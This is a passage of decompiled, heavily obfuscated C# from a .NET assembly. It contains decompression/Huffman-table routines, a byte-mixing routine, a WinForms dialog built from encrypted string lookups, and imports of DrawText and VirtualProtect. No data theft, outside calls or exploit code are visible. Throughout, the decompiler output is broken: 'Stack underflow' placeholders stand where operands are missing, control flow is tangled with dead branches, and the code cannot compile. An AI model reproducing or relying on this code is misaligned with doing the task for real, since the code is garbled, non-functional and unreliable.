				Graphics val = (Graphics)/*Error near IL_00ab: Stack underflow*/;
				try
				{
					_ = global::_0007._007E_008F;
					/*Error near IL_0071: Stack underflow*/((object)/*Error near IL_0071: Stack underflow*/);
					string text = (string)/*Error near IL_0074: Stack underflow*/;
					_ = _009E_0003._007E_0096_0006;
					/*Error near IL_007e: Stack underflow*/((object)/*Error near IL_007e: Stack underflow*/);
					Font val2 = (Font)/*Error near IL_0038: Stack underflow*/;
					*(int*)((byte*)ptr + 4) = global::_0001._0012(P_0);
					*(int*)ptr = _0011._0001(text, val, val2, *(int*)((byte*)ptr + 4));
					if (*(int*)ptr > 0)
					{
						_0090_0002._0015_0005(P_0, *(int*)ptr);
					}
				}
				finally
				{
					if (0 == 0 && (-1 == 0 || val != null) && 4u != 0)
					{
						global::_000F._007E_0099(val);
					}
				}
			}
			catch
			{
			}
		}

		static bool _0001(_000E P_0)
		{
			//IL_001a: Invalid comparison between Unknown and I4
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			try
			{
				if (true && ((_000E)/*Error near IL_000a: Stack underflow*/)._0001.Length == 0)
				{
					goto IL_000f;
				}
				_ = 0;
				goto IL_0021;
				IL_000f:
				_ = ((_000E)/*Error near IL_0014: Stack underflow*/)._0001.Count;
				goto IL_0016;
				IL_0016:
				if (false)
				{
					goto IL_0021;
				}
				bool flag = (int)/*Error near IL_001c: Stack underflow*/ == 0;
				goto end_IL_0000;
				IL_0021:
				if ((int)/*Error near IL_0021: Stack underflow*/ != 0)
				{
					goto IL_0016;
				}
				flag = (byte)/*Error near IL_003c: Stack underflow*/ != 0;
				if (false)
				{
					goto IL_000f;
				}
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0049: Stack underflow*/ != 0;
		}

		unsafe static void _0001(byte[] P_0, global::_0008._0004._0004 P_1)
		{
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_030a: Incompatible stack heights: 0 vs 1
			//IL_0310: Incompatible stack heights: 0 vs 1
			//IL_0316: Incompatible stack heights: 0 vs 2
			//IL_031c: Incompatible stack heights: 0 vs 1
			//IL_0322: Incompatible stack heights: 0 vs 1
			//IL_0328: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[64];
			int[] array = default(int[]);
			int[] array2 = default(int[]);
			try
			{
				array = new int[16];
				array2 = new int[16];
				*(int*)(nint)(/*Error near IL_002a: Stack underflow*/ + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < P_0.Length)
				{
					_ = /*Error near IL_0036: Stack underflow*/+ 16;
					int num = *(int*)(nint)(/*Error near IL_0043: Stack underflow*/ + 12);
					byte num2 = ((byte[])/*Error near IL_0045: Stack underflow*/)[num];
					*(int*)(nint)/*Error near IL_0046: Stack underflow*/ = num2;
					if (*(int*)(nint)(/*Error near IL_004e: Stack underflow*/ + 16) > 0)
					{
						int num3 = *(int*)((byte*)ptr + 16);
						((int[])/*Error near IL_005d: Stack underflow*/)[num3]++;
					}
					(*(int*)((byte*)ptr + 12))++;
				}
				*(int*)ptr = 0;
				*(int*)((byte*)ptr + 4) = 512;
				*(int*)((byte*)ptr + 20) = 1;
				while (*(int*)((byte*)ptr + 20) <= 15)
				{
					array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
					*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
					if (*(int*)((byte*)ptr + 20) >= 10)
					{
						*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
						*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
						*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
					}
					(*(int*)((byte*)ptr + 20))++;
				}
				P_1._0001 = new short[*(int*)((byte*)ptr + 4)];
				*(int*)((byte*)ptr + 8) = 512;
				*(int*)((byte*)ptr + 32) = 15;
				while (*(int*)((byte*)ptr + 32) >= 10)
				{
					*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
					*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
					while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
					{
						P_1._0001[_0011._0001(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
						*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
						*(int*)((byte*)ptr + 40) += 128;
					}
					(*(int*)((byte*)ptr + 32))--;
				}
				*(int*)((byte*)ptr + 44) = 0;
				while (*(int*)((byte*)ptr + 44) < P_0.Length)
				{
					*(int*)((byte*)ptr + 48) = P_0[*(int*)((byte*)ptr + 44)];
					if (*(int*)((byte*)ptr + 48) != 0)
					{
						*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
						*(int*)((byte*)ptr + 52) = _0011._0001(*(int*)ptr);
						if (*(int*)((byte*)ptr + 48) <= 9)
						{
							do
							{
								P_1._0001[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
								*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
							}
							while (*(int*)((byte*)ptr + 52) < 512);
						}
						else
						{
							*(int*)((byte*)ptr + 56) = P_1._0001[*(int*)((byte*)ptr + 52) & 0x1FF];
							*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
							*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
							do
							{
								P_1._0001[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
								*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
							}
							while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
						}
						array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
					}
					(*(int*)((byte*)ptr + 44))++;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, new object[20]
				{
					array,
					array2,
					*(int*)ptr,
					*(int*)((byte*)ptr + 4),
					*(int*)((byte*)ptr + 8),
					*(int*)((byte*)ptr + 12),
					*(int*)((byte*)ptr + 16),
					*(int*)((byte*)ptr + 20),
					*(int*)((byte*)ptr + 24),
					*(int*)((byte*)ptr + 28),
					*(int*)((byte*)ptr + 32),
					*(int*)((byte*)ptr + 36),
					*(int*)((byte*)ptr + 40),
					*(int*)((byte*)ptr + 44),
					*(int*)((byte*)ptr + 48),
					*(int*)((byte*)ptr + 52),
					*(int*)((byte*)ptr + 56),
					*(int*)((byte*)ptr + 60),
					P_1,
					P_0
				});
				throw;
			}
		}

		unsafe static void _0001(global::_0008._0004._0007._0001 P_0)
		{
			//IL_003e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Unknown result type (might be due to invalid IL or missing references)
			//IL_02d2: Incompatible stack heights: 0 vs 1
			//IL_02d8: Incompatible stack heights: 0 vs 1
			//IL_02de: Incompatible stack heights: 0 vs 1
			//IL_02f6: Incompatible stack heights: 0 vs 1
			//IL_02fc: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[32];
			int[] array = default(int[]);
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			int num5 = default(int);
			int[] array2 = default(int[]);
			int[] array3 = default(int[]);
			int num7 = default(int);
			int num8 = default(int);
			int num9 = default(int);
			int num10 = default(int);
			int num11 = default(int);
			try
			{
				IntPtr intPtr = (nint)((global::_0008._0004._0007._0001)/*Error near IL_0019: Stack underflow*/)._0001.LongLength;
				*(int*)(nint)/*Error near IL_001c: Stack underflow*/ = (int)(nint)intPtr;
				array = new int[*(int*)(nint)/*Error near IL_0022: Stack underflow*/];
				num = 0;
				num2 = 0;
				*(int*)(nint)(/*Error near IL_003f: Stack underflow*/ + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
				{
					*(int*)(nint)(/*Error near IL_004a: Stack underflow*/ + 8) = P_0._0001[*(int*)((byte*)ptr + 4)];
					if (*(int*)((byte*)ptr + 8) != 0)
					{
						num3 = num++;
						while (num3 > 0 && P_0._0001[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
						{
							array[num3] = array[num4];
							num3 = num4;
						}
						array[num3] = *(int*)((byte*)ptr + 4);
						num2 = *(int*)((byte*)ptr + 4);
					}
					(*(int*)((byte*)ptr + 4))++;
				}
				while (num < 2)
				{
					num5 = ((num2 < 2) ? (++num2) : 0);
					array[num++] = num5;
				}
				P_0._0002 = Math.Max(num2 + 1, P_0._0001);
				int num6 = num;
				array2 = new int[4 * num - 2];
				array3 = new int[2 * num - 1];
				num7 = num6;
				*(int*)((byte*)ptr + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < num)
				{
					*(int*)((byte*)ptr + 16) = array[*(int*)((byte*)ptr + 12)];
					array2[2 * *(int*)((byte*)ptr + 12)] = *(int*)((byte*)ptr + 16);
					array2[2 * *(int*)((byte*)ptr + 12) + 1] = -1;
					array3[*(int*)((byte*)ptr + 12)] = P_0._0001[*(int*)((byte*)ptr + 16)] << 8;
					array[*(int*)((byte*)ptr + 12)] = *(int*)((byte*)ptr + 12);
					(*(int*)((byte*)ptr + 12))++;
				}
				do
				{
					*(int*)((byte*)ptr + 20) = array[0];
					num8 = array[--num];
					num9 = 0;
					for (num10 = 1; num10 < num; num10 = num10 * 2 + 1)
					{
						if (num10 + 1 < num && array3[array[num10]] > array3[array[num10 + 1]])
						{
							num10++;
						}
						array[num9] = array[num10];
						num9 = num10;
					}
					num11 = array3[num8];
					while ((num10 = num9) > 0 && array3[array[num9 = (num10 - 1) / 2]] > num11)
					{
						array[num10] = array[num9];
					}
					array[num10] = num8;
					*(int*)((byte*)ptr + 24) = array[0];
					num8 = num7++;
					array2[2 * num8] = *(int*)((byte*)ptr + 20);
					array2[2 * num8 + 1] = *(int*)((byte*)ptr + 24);
					*(int*)((byte*)ptr + 28) = Math.Min(array3[*(int*)((byte*)ptr + 20)] & 0xFF, array3[*(int*)((byte*)ptr + 24)] & 0xFF);
					num11 = (array3[num8] = array3[*(int*)((byte*)ptr + 20)] + array3[*(int*)((byte*)ptr + 24)] - *(int*)((byte*)ptr + 28) + 1);
					num9 = 0;
					for (num10 = 1; num10 < num; num10 = num9 * 2 + 1)
					{
						if (num10 + 1 < num && array3[array[num10]] > array3[array[num10 + 1]])
						{
							num10++;
						}
						array[num9] = array[num10];
						num9 = num10;
					}
					while ((num10 = num9) > 0 && array3[array[num9 = (num10 - 1) / 2]] > num11)
					{
						array[num10] = array[num9];
					}
					array[num10] = num8;
				}
				while (num > 1);
				_0011._0001(array2, P_0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, new object[22]
				{
					*(int*)ptr,
					array,
					num,
					num2,
					array2,
					array3,
					num7,
					*(int*)((byte*)ptr + 4),
					*(int*)((byte*)ptr + 8),
					num3,
					num4,
					num5,
					*(int*)((byte*)ptr + 12),
					*(int*)((byte*)ptr + 16),
					*(int*)((byte*)ptr + 20),
					num8,
					num9,
					num10,
					num11,
					*(int*)((byte*)ptr + 24),
					*(int*)((byte*)ptr + 28),
					P_0
				});
				throw;
			}
		}

		static bool _0001(_0006 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0006)/*Error near IL_0007: Stack underflow*/)._0004;
		}

		[DllImport("user32", CharSet = CharSet.Unicode, EntryPoint = "DrawText")]
		static extern int _0001(IntPtr P_0, string P_1, int P_2, ref global::_0006._0004._0001 P_3, int P_4);

		static void _0001(global::_0008._0004._0002 P_0, int P_1)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Expected I4, but got Unknown
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 2
			try
			{
				if (uint.MaxValue != 0)
				{
					_ = ((global::_0008._0004._0002)/*Error near IL_000c: Stack underflow*/)._0001;
					_003F val = /*Error near IL_0011: Stack underflow*/& 0x1F;
					_003F val2 = /*Error near IL_0012: Stack underflow*/>> (int)val;
					((global::_0008._0004._0002)/*Error near IL_0017: Stack underflow*/)._0001 = (uint)(int)val2;
					goto IL_0017;
				}
				goto IL_002b;
				IL_0017:
				if (0 == 0)
				{
					_ = ((global::_0008._0004._0002)/*Error near IL_0023: Stack underflow*/)._0003;
					_003F val3 = /*Error near IL_0026: Stack underflow*/- /*Error near IL_0026: Stack underflow*/;
					((global::_0008._0004._0002)/*Error near IL_002b: Stack underflow*/)._0003 = (int)val3;
				}
				goto IL_002b;
				IL_002b:
				if (0 == 0 && 0 == 0)
				{
					return;
				}
				goto IL_0017;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0002._0006 P_0, global::_000E._0005 P_1, string P_2, string P_3)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			global::_0010._0005 obj = ((global::_0002._0006)/*Error near IL_0007: Stack underflow*/)._0001;
			if (0 == 0)
			{
				global::_0010._0005 obj2 = obj;
			}
			if ((int)/*Error near IL_000f: Stack underflow*/ != 0)
			{
				new _0007((global::_000E._0005)/*Error near IL_003e: Stack underflow*/, (string)/*Error near IL_003e: Stack underflow*/, (string)/*Error near IL_003e: Stack underflow*/);
				/*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/, (_0007)/*Error near IL_0020: Stack underflow*/);
			}
		}

		static byte[] _0001(global::_0006._0001 P_0, string P_1)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Incompatible stack heights: 0 vs 2
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 3
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 2
			//IL_005c: Incompatible stack heights: 0 vs 1
			byte[] array2 = default(byte[]);
			try
			{
				if (7u != 0 && 0 == 0)
				{
					_ = global::_0001._007E_0001;
					/*Error near IL_003f: Stack underflow*/((object)/*Error near IL_003f: Stack underflow*/);
					byte[] array = new byte[/*Error near IL_0011: Stack underflow*/ * 2];
					if (0 == 0)
					{
						array2 = array;
					}
					_ = _0093_0002._001E_0005;
					_ = _009E_0002._007E_008C_0005;
					/*Error near IL_004c: Stack underflow*/((object)/*Error near IL_004c: Stack underflow*/);
					_ = 0;
					_ = 0;
					IntPtr intPtr = (nint)((Array)/*Error near IL_002f: Stack underflow*/).LongLength;
					/*Error near IL_0059: Stack underflow*/((Array)/*Error near IL_0059: Stack underflow*/, (int)/*Error near IL_0059: Stack underflow*/, (Array)/*Error near IL_0059: Stack underflow*/, (int)/*Error near IL_0059: Stack underflow*/, (int)(nint)intPtr);
				}
				return (byte[])/*Error near IL_0034: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array2, (object)P_0, (object)P_1);
				throw;
			}
		}

		unsafe static byte[] _0001(byte[] P_0, byte[] P_1, global::_0006._0001 P_2)
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			//IL_00a6: Incompatible stack heights: 0 vs 1
			//IL_00ac: Incompatible stack heights: 0 vs 2
			//IL_00b2: Incompatible stack heights: 0 vs 1
			byte[] array = default(byte[]);
			byte[] result;
			do
			{
				void* ptr = stackalloc byte[8];
				try
				{
					nint num = (nint)((Array)/*Error near IL_000c: Stack underflow*/).LongLength;
					while (true)
					{
						array = new byte[(int)num];
						*(int*)(nint)/*Error near IL_001e: Stack underflow*/ = 0;
						while (true)
						{
							IL_0023:
							*(int*)(nint)(/*Error near IL_0025: Stack underflow*/ + 4) = 0;
							while (true)
							{
								num = *(int*)((byte*)ptr + 4);
								if (6 == 0)
								{
									break;
								}
								nint num2 = (nint)P_1.LongLength;
								if (0 == 0)
								{
									num2 = (int)num2;
								}
								if (num < num2)
								{
									while (true)
									{
										_ = *(int*)(nint)(/*Error near IL_0038: Stack underflow*/ + 4);
										int num3 = *(int*)(nint)(/*Error near IL_0045: Stack underflow*/ + 4);
										byte num4 = ((byte[])/*Error near IL_0047: Stack underflow*/)[num3];
										byte num5 = P_0[*(int*)ptr];
										((sbyte[])/*Error near IL_004e: Stack underflow*/)[/*Error near IL_004e: Stack underflow*/] = (sbyte)(byte)(num4 + num5);
										if (P_0[*(int*)ptr + 1] != 0)
										{
											goto IL_005e;
										}
										*(int*)ptr = 0;
										if (false)
										{
											continue;
										}
										goto IL_0064;
										IL_005e:
										(*(int*)ptr)++;
										goto IL_0064;
										IL_0064:
										if (2u != 0)
										{
											goto IL_0067;
										}
										goto IL_005e;
									}
									goto IL_0023;
								}
								result = array;
								goto end_IL_000c;
								IL_0067:
								(*(int*)((byte*)ptr + 4))++;
							}
							break;
						}
						continue;
						end_IL_000c:
						break;
					}
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)array, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)P_2, (object)P_1, (object)P_0);
					throw;
				}
			}
			while (7 == 0);
			return result;
		}

		static string _0001()
		{
			//IL_001b: Incompatible stack heights: 0 vs 3
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			_ = global::_0007._007E_0086;
			_ = _0001_0004._007E_0098_0006;
			_009F_0003._0097_0006();
			/*Error near IL_0022: Stack underflow*/((object)/*Error near IL_0022: Stack underflow*/);
			/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/);
			return (string)/*Error near IL_0016: Stack underflow*/;
		}

		static void _0001(bool P_0, _0006 P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((_0006)/*Error near IL_0009: Stack underflow*/)._0004 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
		}

		static void _0001(global::_0004._0010 P_0)
		{
			//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
			//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
			//IL_02b4: Unknown result type (might be due to invalid IL or missing references)
			//IL_0496: Incompatible stack heights: 0 vs 1
			//IL_04a0: Incompatible stack heights: 0 vs 1
			//IL_04ac: Incompatible stack heights: 0 vs 1
			//IL_04b1: Unknown result type (might be due to invalid IL or missing references)
			//IL_04b6: Incompatible stack heights: 0 vs 1
			//IL_04bc: Incompatible stack heights: 0 vs 1
			//IL_04c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_04c6: Incompatible stack heights: 0 vs 1
			//IL_04cc: Incompatible stack heights: 0 vs 1
			//IL_04d1: Unknown result type (might be due to invalid IL or missing references)
			//IL_04d6: Incompatible stack heights: 0 vs 1
			ComponentResourceManager componentResourceManager = default(ComponentResourceManager);
			try
			{
				_001F._009E_0002(typeof(global::_0004._0010).TypeHandle);
				new ComponentResourceManager((Type)/*Error near IL_04a0: Stack underflow*/);
				componentResourceManager = (ComponentResourceManager)/*Error near IL_04a6: Stack underflow*/;
				new Label();
				((global::_0004._0010)/*Error near IL_0029: Stack underflow*/)._0001 = (Label)/*Error near IL_0029: Stack underflow*/;
				new Button();
				((global::_0004._0010)/*Error near IL_0038: Stack underflow*/)._0001 = (Button)/*Error near IL_0038: Stack underflow*/;
				new Button();
				((global::_0004._0010)/*Error near IL_0047: Stack underflow*/)._0002 = (Button)/*Error near IL_0047: Stack underflow*/;
				global::_000F._0007_0002(P_0);
				_0084_0002._007E_009C_0004(P_0._0001, true);
				_0003_0003._007E_0091_0005(P_0._0001, new Point(12, 16));
				_0004_0003._007E_0096_0005(P_0._0001, new Size(480, 800));
				global::_0011._007E_0087_0002(P_0._0001, global::_000E._0003._0001(107390597));
				_0002_0004._007E_0099_0006(P_0._0001, new Padding(0, 0, 0, 92));
				_0004_0003._007E_0092_0005(P_0._0001, new Size(442, 159));
				_0090_0002._007E_0016_0005(P_0._0001, 1);
				_0084_0002._007E_009D_0004(P_0._0001, true);
				global::_0011._007E_007F_0002(P_0._0001, _0003_0004._007E_009A_0006(componentResourceManager, global::_000E._0003._0001(107390612)));
				_0084_0002._007E_009E_0004(P_0._0001, true);
				_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)2);
				_0004_0004._007E_009B_0006(P_0._0001, (DialogResult)6);
				_0005_0004._007E_009C_0006(P_0._0001, (ContentAlignment)16);
				_0003_0003._007E_0091_0005(P_0._0001, new Point(97, 105));
				global::_0011._007E_0087_0002(P_0._0001, global::_000E._0003._0001(107390587));
				_0002_0004._007E_0099_0006(P_0._0001, new Padding(5, 0, 0, 0));
				_0004_0003._007E_0092_0005(P_0._0001, new Size(299, 33));
				if (true)
				{
					_0090_0002._007E_0016_0005(P_0._0001, 2);
					global::_0011._007E_007F_0002(P_0._0001, global::_000E._0003._0001(107390558));
				}
				_0084_0002._007E_009F_0004(P_0._0001, true);
				_0001_0003._007E_008E_0005(P_0._0002, (AnchorStyles)2);
				_0004_0004._007E_009B_0006(P_0._0002, (DialogResult)7);
				_0005_0004._007E_009C_0006(P_0._0002, (ContentAlignment)16);
				_0003_0003._007E_0091_0005(P_0._0002, new Point(97, 144));
				global::_0011._007E_0087_0002(P_0._0002, global::_000E._0003._0001(107390477));
				_0002_0004._007E_0099_0006(P_0._0002, new Padding(5, 0, 0, 0));
				_0004_0003._007E_0092_0005(P_0._0002, new Size(299, 33));
				_0090_0002._007E_0016_0005(P_0._0002, 3);
				global::_0011._007E_007F_0002(P_0._0002, global::_000E._0003._0001(107390944));
				_0084_0002._007E_009F_0004(P_0._0002, true);
				_0006_0004._009D_0006(P_0, new SizeF(6f, 13f));
				_0007_0004._009E_0006(P_0, (AutoScaleMode)1);
				_0084_0002._007E_009C_0004(P_0, true);
				_0008_0004._009F_0006(P_0, (AutoSizeMode)0);
				_000F_0004._007E_0002_0007(P_0, _000E_0004._0001_0007());
				_0004_0003._0094_0005(P_0, new Size(504, 190));
				_0084_0002._0094_0004(P_0, false);
				_0010_0004._007E_0003_0007(_000E_0003._009C_0005(P_0), (Control)(object)P_0._0002);
				_0010_0004._007E_0003_0007(_000E_0003._009C_0005(P_0), (Control)(object)P_0._0001);
				_0010_0004._007E_0003_0007(_000E_0003._009C_0005(P_0), (Control)(object)P_0._0001);
				_0010_0003._009E_0005(P_0, (FormBorderStyle)1);
				_0084_0002._0097_0004(P_0, false);
				_0084_0002._0096_0004(P_0, false);
				global::_0011._0087_0002(P_0, global::_000E._0003._0001(107390883));
				_0084_0002._0095_0004(P_0, false);
				_0011_0004._0004_0007(P_0, (SizeGripStyle)2);
				_0011_0003._009F_0005(P_0, (FormStartPosition)1);
				global::_0011._007E_007F_0002(P_0, global::_000E._0003._0001(107390870));
				_0084_0002._0098_0004(P_0, true);
				_0084_0002._0099_0004(P_0, false);
				global::_000F._0011_0002(P_0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)componentResourceManager, (object)P_0);
				throw;
			}
		}

		[DllImport("kernel32", CharSet = CharSet.Unicode, EntryPoint = "VirtualProtect", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([In] byte[] _0002, IntPtr _0003, int _0004, out int _0005);

		unsafe static int _0001(byte[] P_0, int P_1, global::_0008._0004._0001 P_2, int P_3)
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00bc: Incompatible stack heights: 0 vs 2
			//IL_00c2: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 1
			void* ptr;
			do
			{
				ptr = stackalloc byte[12];
				try
				{
					*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
					while (true)
					{
						if (((global::_0008._0004._0001)/*Error near IL_001b: Stack underflow*/)._0001 != 11)
						{
							_ = /*Error near IL_0026: Stack underflow*/+ 4;
							global::_0008._0004._0003 obj = ((global::_0008._0004._0001)/*Error near IL_003f: Stack underflow*/)._0001;
							_0011._0001((int)/*Error near IL_00d8: Stack underflow*/, (byte[])/*Error near IL_00d8: Stack underflow*/, (int)/*Error near IL_00d8: Stack underflow*/, obj);
							*(_003F*)(nint)/*Error near IL_0045: Stack underflow*/ = /*Error near IL_0045: Stack underflow*/;
							while (true)
							{
								P_1 += *(int*)((byte*)ptr + 4);
								if (3 == 0)
								{
									break;
								}
								if (4 == 0)
								{
									continue;
								}
								goto IL_0053;
							}
							continue;
						}
						goto IL_0075;
						IL_00a1:
						*(int*)((byte*)ptr + 8) = *(int*)ptr;
						break;
						IL_0075:
						while (0 == 0 && !_0011._0001(P_2))
						{
							if (_0011._0001(P_2._0001) > 0)
							{
								if (7 == 0)
								{
									continue;
								}
								if (P_2._0001 != 11)
								{
									break;
								}
							}
							goto IL_00a1;
						}
						continue;
						IL_0053:
						*(int*)ptr += *(int*)((byte*)ptr + 4);
						P_3 -= *(int*)((byte*)ptr + 4);
						if (P_3 != 0)
						{
							goto IL_0075;
						}
						*(int*)((byte*)ptr + 8) = *(int*)ptr;
						if (0 == 0)
						{
							break;
						}
						goto IL_00a1;
					}
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)P_2, (object)P_0, (object)P_1, (object)P_3);
					throw;
				}
			}
			while (false);
			return *(int*)((byte*)ptr + 8);
		}

		static bool _0001()
		{
			//IL_000b: Invalid comparison between Unknown and I4
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			try
			{
				if (0 == 0)
				{
					int num = 89;
					while (true)
					{
						if (num != 0)
						{
							_0011._0001(num);
							goto IL_000a;
						}
						goto IL_000d;
						IL_000a:
						num = (((int)/*Error near IL_000d: Stack underflow*/ > 0) ? 1 : 0);
						goto IL_000d;
						IL_000d:
						if (false)
						{
							continue;
						}
						if (3u != 0)
						{
							break;
						}
						goto IL_000a;
					}
					if (0 == 0)
					{
						bool flag = (byte)/*Error near IL_0021: Stack underflow*/ != 0;
					}
				}
			}
			catch
			{
				bool flag = false;
			}
			return (byte)/*Error near IL_002b: Stack underflow*/ != 0;
		}

		static string _0001()
		{
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			_ = global::_0004._0019;
			global::_000E._0003._0001(107390793);
			global::_000E._0002._0001();
			/*Error near IL_0024: Stack underflow*/((string)/*Error near IL_0024: Stack underflow*/, (string)/*Error near IL_0024: Stack underflow*/);
			return (string)/*Error near IL_0011: Stack underflow*/;
		}

		unsafe static void _0001(global::_0008._0004._0008 P_0)
		{
			//IL_0122: Incompatible stack heights: 0 vs 1
			//IL_0128: Incompatible stack heights: 0 vs 3
			//IL_0138: Incompatible stack heights: 0 vs 1
			//IL_013e: Incompatible stack heights: 0 vs 1
			//IL_0144: Incompatible stack heights: 0 vs 1
			//IL_014a: Incompatible stack heights: 0 vs 1
			//IL_0150: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			try
			{
				_ = ((global::_0008._0004._0008)/*Error near IL_0014: Stack underflow*/)._0001;
				_ = 32768;
				byte[] destinationArray = ((global::_0008._0004._0008)/*Error near IL_0023: Stack underflow*/)._0001;
				if (true)
				{
					Array.Copy((Array)/*Error near IL_0132: Stack underflow*/, (int)/*Error near IL_0132: Stack underflow*/, destinationArray, 0, 32768);
				}
				int num = ((global::_0008._0004._0008)/*Error near IL_0043: Stack underflow*/)._0002;
				((global::_0008._0004._0008)/*Error near IL_004e: Stack underflow*/)._0002 = num - 32768;
